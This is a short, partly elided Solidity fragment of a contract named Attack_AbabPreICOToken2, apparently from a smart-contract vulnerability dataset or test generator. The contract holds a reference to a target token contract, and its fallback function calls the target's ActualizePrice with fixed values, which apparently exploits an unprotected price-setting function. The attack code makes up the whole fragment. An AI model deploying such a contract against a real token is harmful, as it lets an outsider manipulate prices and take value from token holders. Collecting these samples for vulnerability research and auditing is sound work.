...
contract Attack_AbabPreICOToken2 {

  AbabPreICOToken public target_contract;

  function Attack_AbabPreICOToken2(address _targetContract) public payable {
  ...
  function() public payable {
    target_contract.ActualizePrice(10000,  10000,  10000,  10000);
  }
} 
